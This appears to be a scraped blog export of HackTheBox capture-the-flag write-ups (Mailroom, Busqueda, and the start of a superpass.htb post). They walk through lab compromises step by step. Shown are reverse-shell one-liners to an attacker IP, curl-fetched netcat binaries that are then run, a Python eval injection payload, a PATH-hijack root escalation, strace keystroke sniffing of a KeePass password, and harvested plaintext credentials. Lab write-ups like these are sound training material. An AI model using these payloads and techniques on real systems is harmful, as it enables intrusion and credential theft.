listening on [any] 80 ... connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 47198 GET / HTTP/1.1 Host: 10.10.14.35 User-Agent: curl/7.74.0 Accept: */* With this, we can connect a new shell as the web account user.\nTraditional reverse shell 1-liners were very troublesome to introduce, so instead I decided to try and download nc from my kali, then run this binary:\n1 `wget 10.10.14.35/nc -o /tmp/nc; chmod +x /tmp/nc; /tmp/nc 10.10.14.35 8888 -e /bin/bash` Once again, wget is not well working, but I know curl works from my original probing. Perhaps I can curl a bash rev shell script, then pipe it directly to sh?\n1 2 3 4 $ cat r.sh #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.35/8888 0\u0026gt;\u0026amp;1 1 `curl 10.10.14.35/r.sh | sh` This doesn\u0026rsquo;t work either, but finally I learn a compromise: splitting the commands into 3 requests\n1 2 3 4 5 `curl 10.10.14.35/nc -o /tmp/nc` `chmod +x /tmp/nc` `/tmp/nc 10.10.14.35 8888 -e /bin/bash` On kali listener:\n1 2 3 4 5 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.35] from (UNKNOWN) [10.10.11.209] 51538 whoami www-data Lateral Movement Enumerating docker container as www-data Enumerating this session shows us we are not in the same box, but instead a compartmentalized container:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin All users are gone, and in the base directory, we can see a .dockerenv file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ls -al / total 76 drwxr-xr-x 1 root root 4096 Apr 16 05:49 . drwxr-xr-x 1 root root 4096 Apr 16 05:49 .. -rwxr-xr-x 1 root root 0 Apr 16 05:49 .dockerenv drwxr-xr-x 1 root root 4096 Jan 17 2023 bin drwxr-xr-x 2 root root 4096 Sep 3 2022 boot drwxr-xr-x 5 root root 340 Apr 16 05:49 dev drwxr-xr-x 1 root root 4096 Apr 16 05:49 etc drwxr-xr-x 2 root root 4096 Sep 3 2022 home drwxr-xr-x 1 root root 4096 Jan 17 2023 lib drwxr-xr-x 2 root root 4096 Nov 14 2022 lib64 drwxr-xr-x 2 root root 4096 Nov 14 2022 media drwxr-xr-x 2 root root 4096 Nov 14 2022 mnt drwxr-xr-x 2 root root 4096 Nov 14 2022 opt dr-xr-xr-x 321 root root 0 Apr 16 05:49 proc drwx------ 1 root root 4096 Apr 20 14:08 root drwxr-xr-x 1 root root 4096 Nov 15 2022 run drwxr-xr-x 1 root root 4096 Jan 17 2023 sbin drwxr-xr-x 2 root root 4096 Nov 14 2022 srv dr-xr-xr-x 13 root root 0 Apr 16 05:49 sys drwxrwxrwt 1 root root 4096 Apr 16 18:43 tmp drwxr-xr-x 1 root root 4096 Nov 14 2022 usr drwxr-xr-x 1 root root 4096 Nov 15 2022 var Enumerating this container, we can see a the hidden .git file within the web files:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ls -al total 68 drwxr-xr-x 7 root root 4096 Jan 19 2023 . drwxr-xr-x 5 root root 4096 Jan 15 2023 .. drwxr-xr-x 8 root root 4096 Jan 19 2023 .git -rw-r--r-- 1 root root 0 Jan 15 2023 README.md -rwxr-xr-x 1 root root 3453 Jan 19 2023 auth.php -rwxr-xr-x 1 root root 62 Jan 15 2023 composer.json -rwxr-xr-x 1 root root 8096 Jan 15 2023 composer.lock drwxr-xr-x 2 root root 4096 Jan 15 2023 css -rwxr-xr-x 1 root root 5848 Jan 19 2023 dashboard.php drwxr-xr-x 3 root root 4096 Jan 15 2023 font -rwxr-xr-x 1 root root 2594 Jan 15 2023 index.php -rwxr-xr-x 1 root root 6326 Jan 18 2023 inspect.php drwxr-xr-x 2 root root 4096 Jan 15 2023 js -rwxr-xr-x 1 root root 953 Jan 15 2023 register.html drwxr-xr-x 6 root root 4096 Jan 15 2023 vendor Checking the .git/config file reveals credentials for mattew:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main [user] email = matthew@mailroom.htb While the password is shown as HueLover83%23, we know this is a url line. The %23 will convert to #, so the password must be HueLover83#. We can now log in as user matthew back on the primary machine:\n1 2 3 tristan@mailroom:~$ su matthew Password: matthew@mailroom:/home/tristan$ We can finally get the user.txt from matthew\u0026rsquo;s home dir.\nPrivilege Escalation Enumerating system as matthew Also found in matthew\u0026rsquo;s home dir, is a keepass file.\n1 2 matthew@mailroom:~$ ls personal.kdbx personal.kdbx.lock user.txt Finding personal.kdbx.lock is a clear indicator that keepass vault is currently being accessed. Monitoring the folder for a little bit, we can see the lock file appear and disappear very frequently. It seems someone is accessing the keepass vault regularly. If we can perhaps spy on the session that is accessing this vault, we might be able to watch the password being input.\nUsing strace to monitor processes in real time This article covers strace and how it might be used to leak ssh passwords. If we know the process ID that is accessing this kdbx, we can utilize this strategy.\nTo watch processes in real time, I use top:\n1 matthew@mailroom:~$ top We can see kpcli (the keepass command line interface program) and its PID, as it appears and disappears in real time. In another shell session, I submit an strace process once I see kpcli appear:\nstrace output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 matthew@mailroom:~$ strace -p 107030 strace: Process 107030 attached pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3]) read(3, \u0026#34;m\u0026#34;, 1) = 1 select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout) write(4, \u0026#34;m\u0026#34;, 1) = 1 pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3]) read(3, \u0026#34;a\u0026#34;, 1) = 1 select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout) write(4, \u0026#34;a\u0026#34;, 1) = 1 pselect6(4, [3], NULL, NULL, NULL, {[], 8}) = 1 (in [3]) read(3, \u0026#34;t\u0026#34;, 1) = 1 select(4, [3], NULL, [3], {tv_sec=0, tv_usec=0}) = 0 (Timeout) write(4, \u0026#34;t\u0026#34;, 1) = 1 \u0026lt;...SNIP...\u0026gt; The output is messy, but we can see the information of letters being inputted and an echo, likely related to the character being reflected back in the command line. We can clean it up a bit by grepping for read or write:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ cat trace| grep read read(3, \u0026#34;m\u0026#34;, 1) = 1 read(3, \u0026#34;a\u0026#34;, 1) = 1 read(3, \u0026#34;t\u0026#34;, 1) = 1 read(3, \u0026#34;t\u0026#34;, 1) = 1 read(3, \u0026#34;h\u0026#34;, 1) = 1 read(3, \u0026#34;e\u0026#34;, 1) = 1 read(3, \u0026#34;w\u0026#34;, 1) = 1 read(3, \u0026#34;/\u0026#34;, 1) = 1 read(3, \u0026#34;p\u0026#34;, 1) = 1 read(3, \u0026#34;e\u0026#34;, 1) = 1 read(3, \u0026#34;r\u0026#34;, 1) = 1 read(3, \u0026#34;s\u0026#34;, 1) = 1 read(3, \u0026#34;o\u0026#34;, 1) = 1 read(3, \u0026#34;n\u0026#34;, 1) = 1 read(3, \u0026#34;a\u0026#34;, 1) = 1 read(3, \u0026#34;l\u0026#34;, 1) = 1 read(3, \u0026#34;.\u0026#34;, 1) = 1 read(3, \u0026#34;k\u0026#34;, 1) = 1 read(3, \u0026#34;d\u0026#34;, 1) = 1 read(3, \u0026#34;b\u0026#34;, 1) = 1 read(3, \u0026#34;x\u0026#34;, 1) = 1 read(3, \u0026#34;\\n\u0026#34;, 1) = 1 Here at the start, we can see the keepass file being accessed. The next section has what looks to be probably the master password:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 read(0, \u0026#34;!\u0026#34;, 8192) = 1 read(0, \u0026#34;s\u0026#34;, 8192) = 1 read(0, \u0026#34;E\u0026#34;, 8192) = 1 read(0, \u0026#34;c\u0026#34;, 8192) = 1 read(0, \u0026#34;U\u0026#34;, 8192) = 1 read(0, \u0026#34;r\u0026#34;, 8192) = 1 read(0, \u0026#34;3\u0026#34;, 8192) = 1 read(0, \u0026#34;p\u0026#34;, 8192) = 1 read(0, \u0026#34;4\u0026#34;, 8192) = 1 read(0, \u0026#34;$\u0026#34;, 8192) = 1 read(0, \u0026#34;$\u0026#34;, 8192) = 1 read(0, \u0026#34;w\u0026#34;, 8192) = 1 read(0, \u0026#34;0\u0026#34;, 8192) = 1 read(0, \u0026#34;1\u0026#34;, 8192) = 1 read(0, \u0026#34;\\10\u0026#34;, 8192) = 1 read(0, \u0026#34;r\u0026#34;, 8192) = 1 read(0, \u0026#34;d\u0026#34;, 8192) = 1 read(0, \u0026#34;9\u0026#34;, 8192) = 1 read(0, \u0026#34;\\n\u0026#34;, 8192) = 1 Acessing the keepass vault \u0026amp; troubleshooting the password The line \u0026quot;\\10\u0026quot; sticks out as odd, since this is reporting 1 character/keystroke at a time. If we exclude that input, the password becomes !sEcUr3p4$$w01rd9. Trying this password does not work, but looking at the password itself the 1 seems out of place: the password appears to be the words secure and password. Omitting 1 gives us a working password: !sEcUr3p4$$w0rd9, and now the \\10 character becomes more clear: the user must have inputted a 1 as a mistake, then deleted it with backspace. The deletion keystroke appeared in the trace as \\10, and the password was fixed for login purposes.\nViewing the keepass vault shows multiple password entries, but one is clearly more noteworthy than the rest: the root account.\nWe can right click and select copy password to temporarily place the password into our clipboard, or we can view the password plain through edit entry:\nWith this, we can su to root straight from matthew:\n1 2 3 matthew@mailroom:~$ su Password: root@mailroom:/home/matthew# Bonus: inspecting the scripts from the root folder shows that the \\10 char is indeed a deletion\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/python3 import os, random, time, hashlib import pexpect ## This script is used to simulate matthew logging into his database in real time \u0026lt;...SNIP...\u0026gt; send_human(k, f\u0026#39;open {db_path}\u0026#39;) k.expect(\u0026#39;Please provide the master password: \u0026#39;) send_human(k, \u0026#39;!sEcUr3p4$$w01\\010rd9\u0026#39;) # \\010 is a del character Reflection As my first live hard box completion, I was thoroughly impressed by the complexity of the attack chain leveraged to gain a foothold. Between the constant abuse of XSS to the extremely frequent kpcli processes, this box might not be the most realistic, but I enjoyed every trick utilized throughout. I also appreciated the \u0026ldquo;leaked code\u0026rdquo; viewable on the git subdomain, and how it is used to showcase multiple different code vulnerabilities used at different spots within this box.\n","date":"2023-08-19T22:25:45-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-mailroom/Mailroom_hu83fa4872cdc769af1a6c4264f0edd42d_354362_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-mailroom/","title":"HackTheBox - Mailroom"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.93 scan initiated Sun Apr 9 07:47:17 2023 as: nmap -sCV -oN nmap_initial.txt 10.129.203.183 Nmap scan report for 10.129.203.183 Host is up (0.023s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-server-header: Apache/2.4.52 (Ubuntu) |_http-title: Did not follow redirect to http://searcher.htb/ Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Apr 9 07:47:26 2023 -- 1 IP address (1 host up) scanned in 9.27 seconds The open port 80 suggests an http server that we can visit. However, when we try to visit by ip address we are redirected to http://searcher.htb. We must add this address link to are hosts file.\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.208 searcher.htb Exploring the webpage Now upon vising the site, we see the website described as being able to search anything. We are given a wide selection of search engines to use, and then we can detail our search query as well:\nWe also see the option to auto redirect, but at first glance I have no idea what that means. When I select the engine Google and something to search, pressing the Search button results in the generation of a url that we might copy/paste into our browser.\nThis is how the search engine works: you supply the engine and the query, and the webpage will generate a link that can take you to a query using that search engine. Auto-redirect probably configures you to be taken directly to the link rather than this page showing nothing but the link text.\nExamining the bottom of the searcher page, we can see the web service is using Flask, and also that this searchor tool is open source:\nClicking on the Searchor 2.4.0 hyperlink redirects us to a github page\nEnumerating github pull requests and patch histories We can see from github that this is not the most recent version of searchor, so perhaps this version might have an unpatched vulnerability? For popular vulnerabilities, we can simply google search \u0026ldquo;Service Version X.X.X exploit\u0026rdquo; and get plenty of information. However, if Searchor is not big enough it might not get the same level of attention. In this case, it might be more fruitful to look at the version history for searchor, and see if there is any mention of patching an exploit. We can see in the overview for v2.4.2, there is a patched vulnerability mentioned\nSince the webpage is still using 2.4.0, this vulnerability should still exist, if we are able to take advantage. When we look at the link, the details say the search method in the code is utilizing an unsafe eval operation that can allow for arbitrary code execution.\nTo understand a little more, we can look at the code being changed in this pull request:\nWe can see here the two arguments we will provide the service, first being the engine, followed by query. It appears as though if we can escape the single quote wrapping around query, we might be able to directly call arguments in python\u0026rsquo;s eval() statement.\nBy editing the request in burpsuite, we can see when we supply a single ' mark, the request breaks.\nIf we can supply new arguments in the proper syntax, we can achieve code execution.\nFoothold Obtaining shell access as user svc After a little bit of trial and error, I managed to achieve code execution:\nIn addition to the single quote, we also needed ) to end the search function, followed by a , to supply a 2nd object to eval. __import__('os').system() is our set up for command execution, where we supply the shell command in system(). From here, a reverse shell can be obtained by searching for a bash rev shell payload:\n1 asdf\u0026#39;),__import__(\u0026#39;os\u0026#39;).system(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;) # I found that this command had trouble executing from burpsuite, but has no issue if you simply return to the webpage and execute from your browser. On a listening session:\n1 2 3 4 5 6 7 8 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 36252 bash: cannot set terminal process group (1631): Inappropriate ioctl for device bash: no job control in this shell svc@busqueda:/var/www/app$ id id uid=1000(svc) gid=1000(svc) groups=1000(svc) From here, we can grab the user.txt file.\nEnumerating the webserver\u0026rsquo;s git details When exploring the web file system, we see a .git folder in the web root directory:\n1 2 3 4 5 6 7 8 svc@busqueda:/var/www/app$ ls -al ls -al total 20 drwxr-xr-x 4 www-data www-data 4096 Apr 3 14:32 . drwxr-xr-x 4 root root 4096 Apr 4 16:02 .. -rw-r--r-- 1 www-data www-data 1124 Dec 1 2022 app.py drwxr-xr-x 8 www-data www-data 4096 Aug 14 00:07 .git drwxr-xr-x 2 www-data www-data 4096 Dec 1 2022 templates We know this service originally came from a public git repo, but it is a little surprising to see the iconic .git folder when file layout does not at all match with the git repo. When viewing Searchor 2.4.0, this is what the repo looks like:\nA lot of the files have been removed, changed, renamed, or other. However, exploring a little deeper, we can start to see what might be going on:\n1 2 3 svc@busqueda:/var/www/app/.git$ cat logs/HEAD cat logs/HEAD 0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator \u0026lt;administrator@gitea.searcher.htb\u0026gt; 1671970461 +0000 commit (initial): Initial commit When examining the current commit id, we can see the .git is not even associated with the github page Searchor. Instead, it looks like administrator built this webpage personally, utilizing Searchor 2.4.0 code, then created a new git repository with Gitea instead! Gitea is a git-based service that can be self-hosted. Its purpose is similar to Github, but with the option for completely private hosting it allows for a much more isolated development workflow that might never leave a company\u0026rsquo;s infrastructure.\nThe new subdomain is particularly interesting, gitea.searcher.htb. Perhaps if we add this to our /etc/hosts file, we might view it ourselves?\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.208 searcher.htb gitea.searcher.htb Viewing the website:\nSearching around, we can see users administrator and cody, but no repositories are publicly viewable.\nFinding credentials and testing for password re-use When looking back at the .git/config file, we can find credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 13 svc@busqueda:/var/www/app/.git$ cat config cat config [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main We can see in plaintext, cody\u0026rsquo;s password of jh1usoih2bkjaspwe92. If there were a user named cody on the system, my first thought would be to check su to see if i can change my shell user to cody. However, only user svc exists on the box. Still, it might be that user svc was set up by cody, using the same password? It is worth a try, since it costs nothing:\n1 2 3 4 5 6 7 8 9 svc@busqueda:/var/www/app/.git$ sudo -l [sudo] password for svc: Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * I used sudo -l to get the password check for svc, and not only did it work, but we also seem to have a sudo command we can run as root! Another check we might have done is to ssh in as svc. We can still do so, and now we know it will work:\n1 2 3 4 5 $ ssh svc@searcher.htb svc@searcher.htb\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) \u0026lt;...SNIP...\u0026gt; svc@busqueda:~$ Before forgetting about it, the password needs to be checked on the original service as well: the gitea page. It does indeed work, and there is one repository now viewable:\nEnumerating svc\u0026rsquo;s sudo actions Checking out the system-checkup script:\n1 2 svc@busqueda:~$ ls -al /opt/scripts/system-checkup.py -rwx--x--x 1 root root 1903 Dec 24 2022 /opt/scripts/system-checkup.py We cannot write over the file, so the exploit must come from abusing what the file does. Also, we cannot read the file, so we must figure out what is going on by running the script.\n1 2 3 4 5 6 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Usage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkup It appears to be referencing docker containers running on the system. To start, let\u0026rsquo;s check docker-ps:\n1 2 3 4 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 960873171e2e gitea/gitea:latest \u0026#34;/usr/bin/entrypoint…\u0026#34; 7 months ago Up 15 hours 127.0.0.1:3000-\u0026gt;3000/tcp, 127.0.0.1:222-\u0026gt;22/tcp gitea f84a6b33fb5a mysql:8 \u0026#34;docker-entrypoint.s…\u0026#34; 7 months ago Up 15 hours 127.0.0.1:3306-\u0026gt;3306/tcp, 33060/tcp mysql_db We see two containers, interestingly another gitea container? Or is this perhaps the same on we just looked at? I am not familiar enough with docker to know. Next, I try docker-inspect, and use the container ID of the gitea container, 960873171e2e:\n1 2 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 960873171e2e Usage: /opt/scripts/system-checkup.py docker-inspect \u0026lt;format\u0026gt; \u0026lt;container_name\u0026gt; I have no idea what format options are possible, so I have to read up on what this command can do. docker-inspect is a commonly conserved docker command, so there is an entire webpage explaining it. Looking at some examples, I\u0026rsquo;m hoping I can specify something like this command to output all details:\n1 docker inspect --format=\u0026#39;{{json .Config}}\u0026#39; $INSTANCE_ID Running the command and beautifying the output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .Config}}\u0026#39; 960873171e2e { \u0026#34;Hostname\u0026#34;: \u0026#34;960873171e2e\u0026#34;, \u0026#34;Domainname\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;User\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;AttachStdin\u0026#34;: false, \u0026#34;AttachStdout\u0026#34;: false, \u0026#34;AttachStderr\u0026#34;: false, \u0026#34;ExposedPorts\u0026#34;: { \u0026#34;22/tcp\u0026#34;: {}, \u0026#34;3000/tcp\u0026#34;: {} }, \u0026#34;Tty\u0026#34;: false, \u0026#34;OpenStdin\u0026#34;: false, \u0026#34;StdinOnce\u0026#34;: false, \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], \u0026#34;Cmd\u0026#34;: [ \u0026#34;/bin/s6-svscan\u0026#34;, \u0026#34;/etc/s6\u0026#34; ], \u0026#34;Image\u0026#34;: \u0026#34;gitea/gitea:latest\u0026#34;, \u0026#34;Volumes\u0026#34;: { \u0026#34;/data\u0026#34;: {}, \u0026#34;/etc/localtime\u0026#34;: {}, \u0026#34;/etc/timezone\u0026#34;: {} }, \u0026#34;WorkingDir\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Entrypoint\u0026#34;: [ \u0026#34;/usr/bin/entrypoint\u0026#34; ], \u0026#34;OnBuild\u0026#34;: null, \u0026#34;Labels\u0026#34;: { \u0026#34;com.docker.compose.config-hash\u0026#34;: \u0026#34;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515\u0026#34;, \u0026#34;com.docker.compose.container-number\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;com.docker.compose.oneoff\u0026#34;: \u0026#34;False\u0026#34;, \u0026#34;com.docker.compose.project\u0026#34;: \u0026#34;docker\u0026#34;, \u0026#34;com.docker.compose.project.config_files\u0026#34;: \u0026#34;docker-compose.yml\u0026#34;, \u0026#34;com.docker.compose.project.working_dir\u0026#34;: \u0026#34;/root/scripts/docker\u0026#34;, \u0026#34;com.docker.compose.service\u0026#34;: \u0026#34;server\u0026#34;, \u0026#34;com.docker.compose.version\u0026#34;: \u0026#34;1.29.2\u0026#34;, \u0026#34;maintainer\u0026#34;: \u0026#34;maintainers@gitea.io\u0026#34;, \u0026#34;org.opencontainers.image.created\u0026#34;: \u0026#34;2022-11-24T13:22:00Z\u0026#34;, \u0026#34;org.opencontainers.image.revision\u0026#34;: \u0026#34;9bccc60cf51f3b4070f5506b042a3d9a1442c73d\u0026#34;, \u0026#34;org.opencontainers.image.source\u0026#34;: \u0026#34;https://github.com/go-gitea/gitea.git\u0026#34;, \u0026#34;org.opencontainers.image.url\u0026#34;: \u0026#34;https://github.com/go-gitea/gitea\u0026#34; } } There is a lot of information that is tricky to follow, but I\u0026rsquo;m hoping the most notable information is the new password displayed in the GITEA__database__ segment: yuiu1hoiu4i5ho1uh\nFrom here we can enter the mysql database as gitea, and see that there is not much information available.\nSince passwords were re-used before, my first thought is to try this password as the root user on the machine?\n1 2 3 svc@busqueda:~$ su Password: su: Authentication failure It does not work. However, when I return to the gitea webpage and use this credential for user administrator, the password is accepted!\nPrivilege Escalation Reading system-checkup.py source code Now under scripts, we can see what is likely the system-checkup.py we had been executing:\nWith the source code in hand, we can clearly see a very serious oversight in the code:\n1 2 3 4 5 6 7 8 elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) When running full-checkup, the full-checkup.sh is not using the absolute path. Meaning, we can create our own full-checkup.sh in a current working directory, execute full-checkup as root, and our own full-checkup.sh will be ran instead.\nAbusing File Path Manipulation First I enter a directory where i can write files:\n1 2 svc@busqueda:~$ cd /dev/shm svc@busqueda:/dev/shm$ Next, I create a simple reverse shell script under the name full-checkup.sh:\n1 2 3 4 svc@busqueda:/dev/shm$ cat full-checkup.sh #!/bin/bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.139/8888 0\u0026gt;\u0026amp;1 On my kali machine, I set up a listener:\n1 2 $ nc -nvlp 8888 listening on [any] 8888 ... And finally, I run the sudo command:\n1 2 svc@busqueda:/dev/shm$ chmod +x full-checkup.sh svc@busqueda:/dev/shm$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup Back on my listening session:\n1 2 3 4 5 6 7 $ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 60866 root@busqueda:/dev/shm# id id uid=0(root) gid=0(root) groups=0(root) root@busqueda:/dev/shm# Now we are root, and root.txt is up for grabs.\nReflection I quite enjoyed this box, being a rather relaxed set of obstacles while not giving anythinig away for free. Finding the web server so strikingly different from Searchor was a little disorienting, but it makes sense that some modifications would be made to translate Searchor, a cli=based project, into something that a web server can handle for visitors.\n","date":"2023-08-13T10:17:28-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-busqueda/Busqueda_hucd7cd900a381e6f396b4d3fd74d99876_352215_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-busqueda/","title":"HackTheBox - Busqueda"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.92 scan initiated Sat Mar 4 14:42:58 2023 as: nmap -sCV -A -oN nmap_init.txt 10.129.27.120 Nmap scan report for 10.129.27.120 Host is up (0.038s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA) |_ 256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://superpass.htb |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 4 14:43:10 2023 -- 1 IP address (1 host up) scanned in 11.87 seconds Aside from credential-locked ssh, port, we only see http port 80 open. The nmap shows that we will be redirected to http://sueprpass.htb, so we must add this to our /etc/hosts file in order to properly visit:\n1 2 3 4 5 6 7 8 9 10 $ tail /etc/hosts # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.203 superpass.htb We see superpass as a super password manager:\nTrying to login with generic credentials does not succeed, but we are able to register an account, asdf:asdf\nWe see a vault where we can begin to generate passwords, and label them with sites/usernames.\nThe export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.\nWe can see upon clicking Export we are sent to the url http://superpass.htb/vault/export on a GET request:\nAn interesting finding at this point, we see that superpass.htb server is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in 404 Not Found. We will eventually learn that this service is running from Flask, although it wasn\u0026rsquo;t apparent at first glance if you didn\u0026rsquo;t run into the common SQLAlchemy 